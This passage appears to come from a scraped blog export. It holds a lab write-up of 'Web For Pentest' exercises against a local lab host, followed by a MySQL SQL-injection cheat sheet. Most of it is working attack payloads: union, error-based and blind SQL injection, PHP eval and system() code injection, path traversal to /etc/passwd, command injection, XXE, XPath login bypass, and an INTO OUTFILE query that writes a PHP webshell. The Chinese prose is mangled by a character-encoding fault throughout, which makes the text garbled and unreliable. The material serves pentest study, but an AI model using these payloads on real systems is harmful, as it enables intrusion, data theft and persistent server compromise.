1=1%23ï¼Œè¿”å›\nERROR INTEGER REQUIRED å°è¯•2 or 1=1ï¼Œå‘ç°å…¨éƒ¨è¿”å›ï¼ŒçŒœæµ‹æ£€æµ‹å¼€å¤´ç»“å°¾æ˜¯å¦ä¸ºæ•°å­—ï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨\nif(substr((SELECTgroup_concat(schema_name)frominformation_schema.schemata),1,1)=\u0026#39;i\u0026#39;,1,0)and1ç»“æœå‘ç°å¯ä»¥ç›´æ¥åœ¨æ³¨é‡ŠååŠ æ•°å­—å°±å¥½äº†2 or 1=1 %23 1ï¼Œè€Œä¸”ä¹‹å‰çŒœåˆ—æ•°ä¸º 3 ï¼Œä¹ŸçŒœé”™äº†â€¦orz\nè¿˜æ˜¯ä¸å¤Ÿç»†å¿ƒï¼Œé€šè¿‡1 union select 1,2,3,4,5%23 1ï¼Œå¾—åˆ° 5 åˆ—\n1unionSELECT1,group_concat(schema_name),3,4,5frominformation_schema.schemata%231information_schema,exercises1unionSELECT1,group_concat(table_name),3,4,5frominformation_schema.tableswheretable_schema=\u0026#39;exercises\u0026#39;%231users1unionSELECT1,group_concat(column_name),3,4,5frominformation_schema.columnswheretable_name=\u0026#39;users\u0026#39;%231id,name,age,groupid,passwd1unionselect*fromusers%231Example 7 æŸ¥çœ‹æºä»£ç \nif (!preg_match(\u0026#39;/^-?[0-9]+$/m\u0026#39;, $_GET[\u0026#34;id\u0026#34;])) { die(\u0026#34;ERROR INTEGER REQUIRED\u0026#34;);\t} $sql = \u0026#34;SELECT * FROM users where id=\u0026#34;; $sql .= $_GET[\u0026#34;id\u0026#34;]; $result = mysql_query($sql); æˆ‘ä»¬å¯ä»¥ç”¨%0a(æ¢è¡Œ)ç»•è¿‡çº¯æ•°å­—åŒ¹é…ï¼Œ4%0Aor 1=1%23\n1%0aunionSELECT1,group_concat(schema_name),3,4,5frominformation_schema.schemata%23Example 8 http://172.16.71.152/sqli/example8.php?order=name å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªorderæ³¨å…¥ï¼Œå°è¯•æŠ¥é”™æ— å›æ˜¾ï¼Œé‚£å°±åªèƒ½é€šè¿‡ bool æ³¨å…¥æˆ–è€…å»¶æ—¶æ³¨å…¥äº†ï¼Œä½†æ˜¯ fuzz äº†å¾ˆä¹…ï¼Œéƒ½æ— æ³•ç»•è¿‡ï¼Œæœ€åçœ‹æºä»£ç å‘ç°ç”¨çš„æ˜¯åå¼•å·\u0026hellip;\n$sql = \u0026#34;SELECT * FROM users ORDER BY `\u0026#34;; $sql .= mysql_real_escape_string($_GET[\u0026#34;order\u0026#34;]).\u0026#34;`\u0026#34;; ç”¨ sqlmap è·‘äº†ä¸€ä¸‹ï¼Œå‘ç°å¯ä»¥ç”¨\norder=name`=`name`ANDSLEEP(5)AND`name`=`nameorder=name`=`name`AND2137=(SELECT(CASEWHEN(2137=2137)THEN2137ELSE(SELECT8927UNIONSELECT4832)END))-- lMKk æˆåŠŸå»¶æ—¶ï¼Œä»”ç»†åˆ†æï¼Œå…¶å®æ˜¯æ„æˆäº†ä»¥ä¸‹ payload\nSELECT*FROMusersORDERBY`name`=`name`ANDSLEEP(5)AND`name`=`name`;SELECT*FROMusersORDERBY`name`=`name`AND2137=(SELECT(CASEWHEN(2137=2137)THEN2137ELSE(SELECT8927UNIONSELECT4832)END))-- lMKk` è¿™æ ·å°±çœ‹çš„æ¯”è¾ƒæ˜æœ—äº†ï¼Œå…¶å®å°±æ˜¯ç”¨ä¸¤ä¸ªå­—ç¬¦ä¸²å…ˆè¿›è¡Œç›¸ç­‰ï¼Œç„¶åè¿˜æ˜¯ç”¨çš„æ˜¯order byåæ³¨å…¥çš„æ–¹å¼\nExample 9 æ¯”ä¸Šä¸ªè¿˜è¦ç®€å•ï¼Œç›´æ¥æµ‹çš„æ˜¯rand(true)%23ï¼Œå‘ç°æ’åºå‘ç”Ÿå˜åŒ–ï¼Œäºæ˜¯å°±å¯ä»¥ç”¨ bool æ³¨å…¥äº†ï¼Œå°±ä¸å†é‡å¤äº†ã€‚\nCode injection Example 1 http://172.16.71.152/codeexec/example1.php?name=hacker å›æ˜¾\nHello hacker!!! å°è¯• xss\nhttp://172.16.71.152/codeexec/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E// æˆåŠŸalertï¼Œæ²¡å‘ç°è¿™é¢˜é—®é¢˜æ‰€åœ¨ï¼Œè®²é“ç†è¿™ç®—æ˜¯ä¸ª HTML ä»£ç æ³¨å…¥å§2333ï¼Œå°è¯•æ³¨å…¥$aï¼Œå‘ç°æœ‰å›æ˜¾\nNotice: Undefined variable: a in /var/www/codeexec/example1.php(6) : eval()\u0026#39;d code on line 1 Hello !!! è¯´æ˜åº”è¯¥åœ¨eval()å‡½æ•°ä¸­ï¼ŒçŒœæµ‹æ˜¯eval(echo \u0026quot;$a!!!\u0026quot;)è¿™æ ·çš„æ–¹å¼ï¼Œé—­åˆåŒå¼•å·å³å¯ï¼Œ\n\u0026quot;;system('whoami');echo \u0026quot; Example 2 http://172.16.71.152/codeexec/example2.php?order=id ä¼ å…¥$idï¼Œå‘ç°é”™è¯¯å›æ˜¾\nNotice: Undefined variable: id in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Fatal error: Cannot access empty property in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 è¿™ä¸ªæ¯”è¾ƒå¤´å¤§ï¼Œæˆ‘ä»¬ç›´æ¥åˆ†ææºä»£ç \n\u0026lt;?php class User{ public $id, $name, $age; function __construct($id, $name, $age){ $this-\u0026gt;name= $name; $this-\u0026gt;age = $age; $this-\u0026gt;id = $id; } } require_once(\u0026#39;../header.php\u0026#39;); require_once(\u0026#39;../sqli/db.php\u0026#39;); $sql = \u0026#34;SELECT * FROM users \u0026#34;; $order = $_GET[\u0026#34;order\u0026#34;]; $result = mysql_query($sql); if ($result) { while ($row = mysql_fetch_assoc($result)) { $users[] = new User($row[\u0026#39;id\u0026#39;],$row[\u0026#39;name\u0026#39;],$row[\u0026#39;age\u0026#39;]); } if (isset($order)) { usort($users, create_function(\u0026#39;$a, $b\u0026#39;, \u0026#39;return strcmp($a-\u0026gt;\u0026#39;.$order.\u0026#39;,$b-\u0026gt;\u0026#39;.$order.\u0026#39;);\u0026#39;)); } è¿™é‡Œç”¨åˆ°äº†create_functionçš„ä¸€ä¸ª trick ï¼Œå¯ä»¥ç”¨}é—­åˆcreate_functionï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨\nid,$b-\u0026gt;id);}system('ls');//  \nExample 3 http://172.16.71.152/codeexec/example3.php?new=hacker\u0026amp;pattern=/lamer/\u0026amp;base=Hello%20lamer è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹ä»£ç ç®—äº†\u0026hellip;\n\u0026lt;?php echo preg_replace($_GET[\u0026#34;pattern\u0026#34;], $_GET[\u0026#34;new\u0026#34;], $_GET[\u0026#34;base\u0026#34;]); preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int \u0026amp;$count ]] ) : mixed ä½¿ç”¨/eä¿®é¥°ç¬¦ï¼Œpreg_replaceä¼šå°†replacementå‚æ•°å½“ä½œ PHP ä»£ç æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯$_GET['new']\næ‰€ä»¥ç”¨new=system('id');\u0026amp;pattern=/test/e\u0026amp;base=jutst testï¼Œå³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚\n \nFile Upload Example 1 æ¯«æ— è¿‡æ»¤çš„æ–‡ä»¶ä¸Šä¼ \nExample 2 ä½¿ç”¨.php3è¿›è¡Œåç¼€ç»•è¿‡\nDirectory traversal Example 1 http://172.16.71.152/dirtrav/example1.php?file=../../../../../../../../../../etc/passwd Example 2 http://172.16.71.152/dirtrav/example2.php?file=/var/www/files/hacker.png ç›´æ¥è®¿é—®/etc/passwdä¸è¡Œï¼Œç”¨../ç»•è¿‡\nhttp://172.16.71.152/dirtrav/example2.php?file=/var/www/files/../../../../../../../../../etc/passwd Example 3 http://172.16.71.152/dirtrav/example3.php?file=hacker çŒœæµ‹ç»“å°¾æœ‰é™„åŠ .jpgï¼Œç”¨%00æˆªæ–­\nhttp://172.16.71.152/dirtrav/example3.php?file=../../../../../../../etc/passwd%00 Commands injection Example 1 http://172.16.71.152/commandexec/example1.php?ip=127.0.0.1 åŠ ;idæ‰§è¡Œå‘½ä»¤\nExample 2 ç”¨;å‘ç°å›æ˜¾\nInvalid IP address äºæ˜¯ç”¨%0aæ¢è¡Œæ‰§è¡Œå‘½ä»¤\nExample 3 ç›´æ¥åœ¨åé¢åŠ è²Œä¼¼ä¼šè¢«å…ˆè¿‡æ»¤è·³è½¬ï¼Œæ”¾åˆ° burp é‡Œé¢åŠ å°±è¡Œäº†\n \nçœ‹ä¸‹æºä»£ç \n\u0026lt;?php if (!(preg_match(\u0026#39;/^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}.\\d{1,3}$/\u0026#39;, $_GET[\u0026#39;ip\u0026#39;]))) { header(\u0026#34;Location: example3.php?ip=127.0.0.1\u0026#34;); } system(\u0026#34;ping -c 2 \u0026#34;.$_GET[\u0026#39;ip\u0026#39;]); ?\u0026gt;æœç„¶ç›´æ¥è¢«è·³è½¬äº†ï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨ burp è¿˜æ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„\nXML attacks Example 1 http://172.16.71.152/xml/example1.php?xml=%3Ctest%3Ehacker%3C/test%3E æ²¡ä»€ä¹ˆè¿‡æ»¤çš„ xxe ï¼Œåˆ æ‰ä¸‹è½½çš„ç©ºæ ¼æ¢è¡Œä»€ä¹ˆçš„å°±å¥½äº†ï¼Œè®°å¾— urlencode\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt; \u0026lt;!DOCTYPE root [\u0026lt;!ENTITY file SYSTEM \u0026quot;file:///etc/passwd\u0026quot;\u0026gt;]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;file;\u0026lt;/root\u0026gt; Example 2 http://172.16.71.152/xml/example2.php?name=hacker çœ‹æºç å¾—åˆ°\n\u0026lt;?php require_once(\u0026#34;../header.php\u0026#34;); $x = \u0026#34;\u0026lt;data\u0026gt;\u0026lt;users\u0026gt;\u0026lt;user\u0026gt;\u0026lt;name\u0026gt;hacker\u0026lt;/name\u0026gt;\u0026lt;message\u0026gt;Hello hacker\u0026lt;/message\u0026gt;\u0026lt;password\u0026gt;pentesterlab\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\u0026lt;user\u0026gt;\u0026lt;name\u0026gt;admin\u0026lt;/name\u0026gt;\u0026lt;message\u0026gt;Hello admin\u0026lt;/message\u0026gt;\u0026lt;password\u0026gt;s3cr3tP4ssw0rd\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\u0026lt;/users\u0026gt;\u0026lt;/data\u0026gt;\u0026#34;; $xml=simplexml_load_string($x); $xpath = \u0026#34;users/user/name[.=\u0026#39;\u0026#34;.$_GET[\u0026#39;name\u0026#39;].\u0026#34;\u0026#39;]/parent::*/message\u0026#34;; $res = ($xml-\u0026gt;xpath($xpath)); while(list( ,$node) = each($res)) { echo $node; } ?\u0026gt;çœ‹åˆ°æºç å°±çŸ¥é“æ˜¯ä¸€ä¸ª xpath æ³¨å…¥äº†ï¼Œæ¯”è¾ƒç±»ä¼¼ sql æ³¨å…¥ï¼Œç”¨or 1=1çš„æ–¹å¼ç»•è¿‡å³å¯\nusers/user/name[.=\u0026#39;hacker\u0026#39; or \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;]/parent::*/message è·å–åˆ°äº†\nHello hackerHello admin ç”¨admin' and '1'='1å¾—åˆ° admin çš„è®¤è¯\nConclusion æ€»ç»“ä»¥ä¸‹è¿˜æ˜¯æœ‰ç‚¹æ”¶è·çš„ï¼Œæ¯”å¦‚create_functioné‚£é‡Œçš„ç»•è¿‡ï¼Œè¿˜æœ‰ LDAP æ³¨å…¥ä»¥åŠ XPath æ³¨å…¥ï¼Œ SQL æ³¨å…¥é‚£é‡Œä¹Ÿæœ‰ç‚¹æ”¶è·ï¼Œæ¯”å¦‚åå¼•å·çš„åˆ©ç”¨ï¼Œä¹Ÿå¯¹order byæ³¨å…¥æœ‰äº†æ›´å¥½çš„ç†è§£ã€‚\n","date":"2019-03-08T23:31:42Z","permalink":"https://blog.zeddyu.info/2019/03/08/Web-For-Pentest/","title":"Web For Pentest"},{"content":"è‡ªç”¨ Sqli å¤‡å¿˜å½•ï¼Œéšæ—¶æ›´æ–°\n[TOC]\nMysql(åŸºäº 10.3.11-MariaDB) Basic æŸ¥çœ‹å½“å‰æ•°æ®åº“ç‰ˆæœ¬   VERSION()\n  @@VERSION\n  @@GLOBAL.VERSION\n  å½“å‰ç™»å½•ç”¨æˆ·   USER()\n  CURRENT_USER()\n  SYSTEM_USER()\n  SESSION_USER()\n  å½“å‰ä½¿ç”¨çš„æ•°æ®åº“   DATABASE()\n  SCHEMA()\n  å½“å‰çš„æ“ä½œç³»ç»Ÿ  @@version_compile_os  è·¯å¾„ç›¸å…³  @@BASEDIR : mysqlå®‰è£…è·¯å¾„ï¼š @@SLAVE_LOAD_TMPDIR : ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„ï¼š @@DATADIR : æ•°æ®å­˜å‚¨è·¯å¾„ï¼š @@CHARACTER_SETS_DIR : å­—ç¬¦é›†è®¾ç½®æ–‡ä»¶è·¯å¾„ @@LOG_ERROR : é”™è¯¯æ—¥å¿—æ–‡ä»¶è·¯å¾„ï¼š @@PID_FILE : pid-fileæ–‡ä»¶è·¯å¾„ @@BASEDIR : mysqlå®‰è£…è·¯å¾„ï¼š @@SLAVE_LOAD_TMPDIR : ä¸´æ—¶æ–‡ä»¶å¤¹è·¯å¾„  å­—æ¯/æ•°å­—ç›¸å…³  ASCII(): è·å–å­—æ¯çš„asciiç å€¼ BIN(): è¿”å›å€¼çš„äºŒè¿›åˆ¶ä¸²è¡¨ç¤º CONV(): è¿›åˆ¶è½¬æ¢ FLOOR(): å‡½æ•°åªè¿”å›æ•´æ•°éƒ¨åˆ†ï¼Œå°æ•°éƒ¨åˆ†èˆå¼ƒã€‚ ROUND(): å‡½æ•°å››èˆäº”å…¥ï¼Œå¤§äº0.5çš„éƒ¨åˆ†è¿›ä½ï¼Œä¸åˆ°åˆ™èˆå¼ƒã€‚ LOWER()ï¼šè½¬æˆå°å†™å­—æ¯ UPPER(): è½¬æˆå¤§å†™å­—æ¯ HEX():åå…­è¿›åˆ¶ç¼–ç  UNHEX()ï¼šåå…­è¿›åˆ¶è§£ç   å­—ç¬¦ä¸²æˆªå–  MID(column_name,start[,length])\tstartèµ·å§‹ä¸º1 LEFT(str,length) lengthä¸ºä»å·¦è¾¹å¼€å§‹è¦è¿”å›çš„å­—ç¬¦æ•° RIGHT(str,length). lengthä¸ºä»å³è¾¹å¼€å§‹è¦è¿”å›çš„å­—ç¬¦æ•° SUBSTR(str,pos,len) ä»poså¼€å§‹æˆªå–lenä¸ª,posèµ·å§‹ä¸º1,pos å¯ä»¥æ˜¯è´Ÿå€¼ SUBSTRING(str,pos,len). ä¸subsets()ç›¸åŒ  \u0026lsquo;æ³¨é‡Š\u0026rsquo;  â€” -(\u0026ndash;åé¢æœ‰ä¸ªç©ºæ ¼)  select * from message ;-- -where id =1;      select * from message ;--where id =1; â€”+  select * from message ;â€”+where id =1;   #  select * from message ;#where id =1;   %00  select * from message ;%00where id =1;   /**/  select * from message ;/*where id =1;*/    å¸¸ç”¨è¯­å¥ æŸ¥æ‰¾æ‰€æœ‰ç”¨æˆ·\nselectgroup_concat(user)frommysql.user;ç”¨æˆ·hashï¼š\nselectgroup_concat(password)frommysql.userwhereuser=\u0026#39;root\u0026#39;æ•°æ®åº“\nSELECTgroup_concat(schema_name)frominformation_schema.schemata;selectdistinct(database_name)frommysql.innodb_table_stats;selectdistinct(Db)frommysql.db;è¡¨åï¼š\nSELECTgroup_concat(table_name)frominformation_schema.tableswheretable_schema=\u0026#39;table_name\u0026#39;;//è¡¨ä¸­æœ‰ä¸»ç çº¦æŸï¼Œéç©ºçº¦æŸç­‰å®Œæ•´æ€§çº¦æŸæ¡ä»¶çš„æ‰èƒ½ç”¨è¿™ä¸ªè¯­å¥æŸ¥è¯¢å‡ºæ¥SELECTgroup_concat(table_name)frominformation_schema.table_constraintswheretable_schema=\u0026#39;table_name_xxx\u0026#39;;//mysql\u0026gt;5.6selectdistinct(table_name)frommysql.innodb_index_stats;åˆ—å:\nSELECTgroup_concat(column_name)frominformation_schema.columnswheretable_name=\u0026#39;column_name_xxx\u0026#39;;è¯»æ–‡ä»¶ï¼š\nSELECTload_file(\u0026#39;/etc/passwd\u0026#39;);å†™æ–‡ä»¶ï¼š\nSELECT\u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39;intooutfile\u0026#39;/var/www/html/shell.php\u0026#39;;æ³¨å…¥æŠ€æœ¯ Union æ³¨å…¥ åˆ¤æ–­æ˜¯å¦å¯ä»¥æ³¨å…¥ å‡è®¾æœ‰: www.test.com/?id=1\næ•°å€¼å‹æ³¨å…¥ ?id=1+1 ?id=-1 or 1=1 ?id=-1 or 10-2=8 ?id=1 and 1=2 ?id=1 and 1=1 å­—ç¬¦å‹æ³¨å…¥ ?id=1' ?id=1\u0026quot; ?id=1' and '1'='1 ?id=1\u0026quot; and \u0026quot;1\u0026quot;=\u0026quot;1 ?id=1') ?id=1\u0026quot;) ?id=1') and '1'='1 ?id=1\u0026quot;) and \u0026quot;1\u0026quot;=\u0026quot;1 æŸ¥è¯¢åˆ—æ•° ç”¨UNION SELECTæ³¨å…¥æ—¶ï¼Œè‹¥åé¢è¦æ³¨å‡ºçš„æ•°æ®çš„åˆ—ä¸åŸæ•°æ®åˆ—æ•°ä¸åŒï¼Œåˆ™ä¼šå¤±è´¥ã€‚æ‰€ä»¥éœ€è¦å…ˆçŒœè§£åˆ—æ•°ã€‚\nUNIONSELECT1,2,3#UNIONALLSELECT1,2,3#UNIONALLSELECTnull,null,null#ORDERBY10#ORDERBY5#ORDERBY2#....åŸºæœ¬ç”¨æ³• UNIONSELECT1,password,3fromadminè¿‡æ»¤äº†é€—å·çš„ union æ³¨å…¥ mysql\u0026gt;select1,2,3unionselect*from(selectversion())ajoin(selectdatabase())bjoin(selectdatabase())c;+-----------------+------+------+ |1|2|3|+-----------------+------+------+ |1|2|3||10.3.11-MariaDB|test|test|+-----------------+------+------+ æŠ¥é”™æ³¨å…¥ åˆ©ç”¨æ•°æ®åº“æŠ¥é”™æ¥æ˜¾ç¤ºæ•°æ®çš„æ³¨å…¥æ–¹å¼ç»å¸¸ä¼šåœ¨å…¥ä¾µä¸­åˆ©ç”¨åˆ°ï¼Œè¿™ç§æ–¹æ³•æœ‰ä¸€ç‚¹å±€é™æ€§ï¼Œéœ€è¦é¡µé¢æœ‰é”™è¯¯å›æ˜¾ã€‚\nåˆ†ç±» MYSQLæŠ¥é”™æ³¨å…¥å¤§ä½“å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š\n BIGINTç­‰æ•°æ®ç±»å‹æº¢å‡º xpathè¯­æ³•é”™è¯¯ concat+rand()+group_by()å¯¼è‡´ä¸»é”®é‡å¤ ç©ºé—´æ•°æ®ç±»å‹å‡½æ•°é”™è¯¯  floor æ³¨å…¥è¯­å¥ ?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)  floorï¼šå‡½æ•°åªè¿”å›æ•´æ•°éƒ¨åˆ†ï¼Œå°æ•°éƒ¨åˆ†èˆå¼ƒã€‚ roundï¼šå‡½æ•°å››èˆäº”å…¥ï¼Œå¤§äº0.5çš„éƒ¨åˆ†è¿›ä½ï¼Œä¸åˆ°åˆ™èˆå¼ƒã€‚  æ³¨å…¥åŸç† ç›®å‰æ¯”è¾ƒå¸¸è§çš„å‡ ç§æŠ¥é”™æ³¨å…¥çš„æ–¹æ³•éƒ½æ˜¯åˆ©ç”¨äº†mysqlæŸäº›ä¸èƒ½ç§°ä¸ºbugçš„bugæ¥å®ç°çš„ã€‚\nä¸‹é¢å°±ä»¥ rand() å‡½æ•°æ¥è¿›è¡Œè¯´æ˜ã€‚mysqlçš„å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ rand() å‡½æ•°æœ‰ç‰¹æ®Šçš„è¯´æ˜ï¼š\nRAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this: å®˜æ–¹æ–‡æ¡£ä¸­çš„æ„æ€æ˜¯ï¼šåœ¨whereè¯­å¥ä¸­ï¼Œwhereæ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand()å‡½æ•°å°±ä¼šè¢«è®¡ç®—ä¸€æ¬¡ã€‚rand()ä¸èƒ½ä½œä¸ºorder byçš„æ¡ä»¶å­—æ®µï¼ŒåŒç†ä¹Ÿä¸èƒ½ä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µã€‚\nå› æ­¤åœ¨ mysql ä¸­ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªå€¼ä¸ç¡®å®šè€Œæœ‰å¯é‡å¤çš„å­—æ®µä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µï¼Œè¿™æ˜¯å°±å¯ä»¥æŠ¥å‡ºç±»ä¼¼äºDuplicate entry â€˜â€¦â€™ for key â€˜group_keyâ€™çš„é”™è¯¯\nUpdateXml(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½) MySQL 5.1.5ç‰ˆæœ¬ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ExtractValue()å’ŒUpdateXML()\nå› æ­¤åœ¨mysql å°äº5.1.5ä¸­ä¸èƒ½ç”¨ExtractValueå’ŒUpdateXMLè¿›è¡ŒæŠ¥é”™æ³¨å…¥ã€‚\næ³¨å…¥è¯­å¥ ?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) æ³¨å…¥åŸç† UPDATEXML (XML_document, XPath_string, new_value);  ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸º Doc ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string ( Xpath æ ¼å¼çš„å­—ç¬¦ä¸²) ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒString æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼  è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ã€‚å¦‚æœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºNULL ï¼Œåˆ™è¿”å›å€¼ä¸ºNULLã€‚\né€šè¿‡æŸ¥è¯¢@@version,è¿”å›ç‰ˆæœ¬ã€‚ç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUPDATEXMLç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åæŠ¥é”™ã€‚\nExtractValue(æœ‰é•¿åº¦é™åˆ¶,æœ€é•¿32ä½) æ³¨å…¥è¯­å¥ ?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) æ³¨å…¥åŸç† EXTRACTVALUE (XML_document, XPath_string);  ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸º Doc ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string ( Xpath æ ¼å¼çš„å­—ç¬¦ä¸²) ä½œç”¨ï¼šä»ç›®æ ‡ XML ä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²  ç¬¬äºŒä¸ªå‚æ•°éƒ½è¦æ±‚æ˜¯ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œ\nNAME_CONST(é€‚ç”¨äºä½ç‰ˆæœ¬ï¼Œä¸å¤ªå¥½ç”¨) ?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection ?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5ä»¥ä¸Š) åœ¨ mysql 5.5 ä¹‹å‰ï¼Œæ•´å½¢æº¢å‡ºæ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£è¯´æ˜out-of-range-and-overflowï¼Œåªæœ‰ç‰ˆæœ¬å·å¤§äº5.5.5 æ—¶ï¼Œæ‰ä¼šæŠ¥é”™ã€‚åˆ©ç”¨expå‡½æ•°ä¹Ÿäº§ç”Ÿç±»ä¼¼çš„æº¢å‡ºé”™è¯¯\n?id=1 and (select exp(~(select * from(select user())x))) æµ‹è¯•æœªé€šè¿‡ï¼Œå­˜åœ¨å¯ç”¨æ€§çš„ emetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring()\nä»¥ä¸Šå‡½æ•°å‡ä¸ºMySQLä¸­çš„ç©ºé—´æ•°æ®ç±»å‹ï¼ˆå­˜å‚¨ï¼‰çš„å‡½æ•°ï¼Œç›®å‰ä»…åœ¨MyISAMæ•°æ®å¼•æ“ä¸‹æä¾›ç©ºé—´ç´¢å¼•æ”¯æŒ,è¦æ±‚å‡ ä½•å­—æ®µéç©º\nmultipoint() ?id=1 or multipoint((select * from(select * from(select user())a)b))%23 multipolygon() ?id=1 or multipolygon((select * from(select * from(select database())a)b))%23 multilinestring() ?id=1 or multilinestring((select * from(select * from(select user())a)b))%23 linestring() ?id=1 or LINESTRING((select * from(select * from(select user())a)b))%23 GeometryCollection() ?id=1 or GeometryCollection((select * from(select * from(select user())a)b))%23 polygon() ?id=1 or polygon((select * from(select * from(select user())a)b))%23 Bool ç›²æ³¨ åœ¨è®¸å¤šæƒ…å†µä¸‹ï¼Œé€šè¿‡å‰é¢çš„æµ‹è¯•ä¼šå‘ç°é¡µé¢æ²¡æœ‰å›æ˜¾æå–çš„æ•°æ®ï¼Œä½†æ˜¯æ ¹æ®è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸä¸å¦ä¼šæœ‰ä¸€äº›ç›¸åº”çš„å˜åŒ–ã€‚\n æ­£ç¡®/é”™è¯¯çš„è¯­å¥ä½¿å¾—é¡µé¢æœ‰é€‚åº¦çš„å˜åŒ–ã€‚å¯ä»¥å°è¯•ä½¿ç”¨å¸ƒå°”æ³¨å…¥ æ­£ç¡®è¯­å¥è¿”å›æ­£å¸¸é¡µé¢ï¼Œé”™è¯¯çš„è¯­å¥è¿”å›é€šç”¨é”™è¯¯é¡µé¢ã€‚å¯ä»¥å°è¯•ä½¿ç”¨å¸ƒå°”æ³¨å…¥ã€‚ æäº¤é”™è¯¯è¯­å¥ï¼Œä¸å½±å“é¡µé¢çš„æ­£å¸¸è¾“å‡ºã€‚å»ºè®®å°è¯•ä½¿ç”¨å»¶æ—¶æ³¨å…¥ã€‚  å‡ ç§ç®€å•çš„åˆ¤æ–­è¯­å¥ï¼Œåœ¨çœŸå®åˆ©ç”¨ä¸­éœ€è¦æ ¹æ®æƒ…å†µè€Œå˜åŒ–:\n CASE IF() IFNULL() NULLIF()  ç›²æ³¨çš„æ—¶å€™ä¸€å®šæ³¨æ„ï¼ŒMySQL4ä¹‹åå¤§å°å†™ä¸æ•æ„Ÿï¼Œå¯ä½¿ç”¨binary()å‡½æ•°ä½¿å¤§å°å†™æ•æ„Ÿã€‚\næ„é€  bool æ¡ä»¶ //æ­£å¸¸æƒ…å†µ 'or bool# true'and bool# //ä¸ä½¿ç”¨ç©ºæ ¼ã€æ³¨é‡Š 'or(bool)='1 true'and(bool)='1 //ä¸ä½¿ç”¨orã€andã€æ³¨é‡Š '^!(bool)='1 '=(bool)=' '||(bool)='1 true'%26%26(bool)='1 '=if((bool),1,0)='0 //ä¸ä½¿ç”¨ç­‰å·ã€ç©ºæ ¼ã€æ³¨é‡Š 'or(bool)\u0026lt;\u0026gt;'0 'or((bool)in(1))or'0 //å…¶ä»– or (case when (bool) then 1 else 0 end) æœ‰æ—¶å€™whereå­—å¥æœ‰æ‹¬å·åˆçŒœä¸åˆ° SQL è¯­å¥çš„æ—¶å€™ï¼Œå¯ä»¥æœ‰ä¸‹åˆ—ç±»ä¼¼çš„ fuzz\n1\u0026#39; or (bool) 